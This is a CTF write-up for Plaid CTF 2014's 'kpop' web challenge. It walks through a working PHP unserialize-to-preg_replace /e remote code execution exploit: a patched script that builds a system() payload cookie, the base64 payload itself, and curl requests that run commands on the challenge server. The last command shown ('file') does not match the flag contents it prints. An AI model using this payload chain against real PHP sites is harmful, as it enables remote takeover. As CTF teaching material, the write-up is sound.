# Plaid CTF 2014: kpop

**Category:** Web
**Points:** 200
**Description:**

> Sometimes, the Plague leaves some of his old stuff up and running. We found a [K-Pop lyrics website](http://54.234.123.205/) the Plague wrote back when he was learning to program. It was [open-source](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2), too! We believe there might be something important in `/home/flag/flag`. Could you get it for us?

## Write-up

[The `/import.php` endpoint](http://54.234.123.205/import.php) has a form that accepts user input. Its source code (part of [the provided tarball](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2)) calls `User::addLyrics($newperms)` when the form is submitted. Here’s the source code for this class:

```php
class User {
  static function addLyrics($lyrics) {
    $oldlyrics = array();
    if (isset($_COOKIE['lyrics'])) {
      $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));
    }
    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;
    setcookie('lyrics', base64_encode(serialize($oldlyrics)));
  }
  static function getLyrics() {
    if (isset($_COOKIE['lyrics'])) {
      return unserialize(base64_decode($_COOKIE['lyrics']));
    }
    else {
      setcookie('lyrics', base64_encode(serialize(array(1, 2))));
      return array(1, 2);
    }
  }
};
```

A-ha! It performs serialization of user-controlled input (the value of the `lyrics` cookie).

[The provided source code](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2) also contains an `OutputFilter` class in `classes.php` that takes two arguments: a pattern and a replacement. These arguments are then passed to `preg_replace()`. If we can somehow manage to use the deprecated `/e` modifier for `preg_replace()`, this would enable remote code execution. [The PHP documentation describes this ‘feature’ as follows](http://php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval):

> If this deprecated modifier is set, `preg_replace()` does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string.

Adding one and one together, it’s possible to craft an exploit that uses the unsafe serialization vulnerability to trigger the remote code execution vulnerability. First, we create a custom value for the `lyrics` cookie. This value must be equal to `base64_encode(serialize($lyrics))` for an instance of any `Lyrics` object.

Let’s make a copy of `classes.php` and save it as [`classes-patched.php`](classes-patched.php). I made a few changes, so that it returns a value for the `lyrics` cookie containing a remote code execution payload:

```diff
--- classes.php	2014-04-11 05:46:37.000000000 +0200
+++ classes-patched.php	2014-04-12 13:33:37.000000000 +0200
@@ -1,5 +1,15 @@
 <?php

+// Modern versions of PHP log this warning:
+// > PHP Deprecated: `preg_replace()`: The `/e` modifier is deprecated, use
+// > `preg_replace_callback` instead in `classes.php` on line 11
+// Turn off all error reporting to avoid this.
+error_reporting(0);
+
+// Allow passing a shell argument containing the desired payload, e.g.
+// $ php classes-patched.php 'cat /etc/passwd'
+$command = isset($argv[1]) ? $argv[1] : 'ls -lsa';
+
 class OutputFilter {
   protected $matchPattern;
   protected $replacement;
@@ -57,9 +67,13 @@
   protected $group;
   protected $url;
   function __construct($name, $group, $url) {
+    global $command;
     $this->name = $name; $this->group = $group;
     $this->url = $url;
-    $fltr = new OutputFilter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>");
+    $fltr = new OutputFilter(
+      "/^./e",
+      'system("' . str_replace('"', '\\"', $command) . '")'
+    );
     $this->logger = new Logger(new LogWriter_File("song_views", new LogFileFormat(array($fltr), "\n")));
   }
   function __toString() {
@@ -156,3 +170,8 @@
   }
 };

+// Create a dummy `Lyrics` instance.
+$song = new Song('name', 'group', 'url');
+$lyric = new Lyrics('lyrics', $song);
+// Get its serialized form, base64-encode it, and print it.
+echo base64_encode(serialize($lyric)) . PHP_EOL;
```

Here’s an example of its output:

```bash
$ php classes-patched.php 'pwd'
Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjY6Imx5cmljcyI7czo3OiIAKgBzb25nIjtPOjQ6IlNvbmciOjQ6e3M6OToiACoAbG9nZ2VyIjtPOjY6IkxvZ2dlciI6MTp7czoxMjoiACoAbG9nd3JpdGVyIjtPOjE0OiJMb2dXcml0ZXJfRmlsZSI6Mjp7czoxMToiACoAZmlsZW5hbWUiO3M6MTA6InNvbmdfdmlld3MiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czo1OiIvXi4vZSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6MTM6InN5c3RlbSgicHdkIikiO319czo3OiIAKgBlbmRsIjtzOjE6IgoiO319fXM6NzoiACoAbmFtZSI7czo0OiJuYW1lIjtzOjg6IgAqAGdyb3VwIjtzOjU6Imdyb3VwIjtzOjY6IgAqAHVybCI7czozOiJ1cmwiO319
/ctfs/write-ups/plaid-ctf-2014/kpop
```

Note that it doesn’t just print the desired cookie value — it also executes the payload on our local system as an unfortunate side effect. To hide this part of the output, we can pipe to `head -n1`:

```bash
$ php classes-patched.php 'pwd' | head -n1
Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjY6Imx5cmljcyI7czo3OiIAKgBzb25nIjtPOjQ6IlNvbmciOjQ6e3M6OToiACoAbG9nZ2VyIjtPOjY6IkxvZ2dlciI6MTp7czoxMjoiACoAbG9nd3JpdGVyIjtPOjE0OiJMb2dXcml0ZXJfRmlsZSI6Mjp7czoxMToiACoAZmlsZW5hbWUiO3M6MTA6InNvbmdfdmlld3MiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czo1OiIvXi4vZSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6MTM6InN5c3RlbSgicHdkIikiO319czo3OiIAKgBlbmRsIjtzOjE6IgoiO319fXM6NzoiACoAbmFtZSI7czo0OiJuYW1lIjtzOjg6IgAqAGdyb3VwIjtzOjU6Imdyb3VwIjtzOjY6IgAqAHVybCI7czozOiJ1cmwiO319
```

Now we can start sending requests to the vulnerable server using the generated cookie value. There’s no need to enter anything in the “data to import” form field.

```bash
$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'ls -lsa' | head -n1)" 'http://54.234.123.205/import.php'
total 52
4 drwxr-xr-x  3 root root 4096 Apr 12 07:55 .
4 drwxr-xr-x 12 root root 4096 Apr 11 19:40 ..
4 -rw-r--r--  1 root root 1150 Apr 11 19:50 add_song.php
8 -rw-r--r--  1 root root 4308 Apr 12 07:55 classes.php
4 -rw-r--r--  1 root root   93 Apr 11 19:50 data.php
4 -rw-r--r--  1 root root  417 Apr 11 19:50 export.php
4 -rw-r--r--  1 root root  864 Apr 11 19:50 import.php
4 -rw-r--r--  1 root root  177 Apr 11 19:41 index.html
4 -rw-r--r--  1 root root  423 Apr 11 19:50 index.php
4 drw-rw-rw-  2 root root 4096 Apr 12 07:52 logs
4 -rw-r--r--  1 root root  454 Apr 11 19:50 song.php
4 -rw-r--r--  1 root root  777 Apr 11 19:50 songs.php
<html>
  <head>
    <title>The Plague's KPop Fan Page - Imported Songs</title>
  </head>
  <body>
    <p>Your songs have been imported! Go back to the <a href="songs.php">songs</a> page to see them!</p>
  </body>
</html>
```

The challenge description mentioned `/home/flag/flag`. What could it be?

```bash
$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'file /home/flag/flag' | head -n1)" 'http://54.234.123.205/import.php'
/home/flag/flag: ASCII text
<html>
…
```

Surprise — it’s a plain text file! Who knew?! Let’s view its contents:

```bash
$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'file /home/flag/flag' | head -n1)" 'http://54.234.123.205/import.php'
One_of_our_favorite_songs_is_bubble_pop
<html>
…
```

The flag is `One\_of\_our\_favorite\_songs\_is\_bubble\_pop`.

## Other write-ups and resources

* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-200-kpop-bad-deserialization>
* <http://akaminsky.net/plaidctf-quals-2014-web-200-kpop/>
* [Solution in PHP by @manhluat93](https://gist.github.com/anonymous/31bfc4eea34fb213e4bc)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/kPOP)
* <http://blog.dragonsector.pl/2014/04/plaidctf-2014-kpop-and-reeekeee.html>
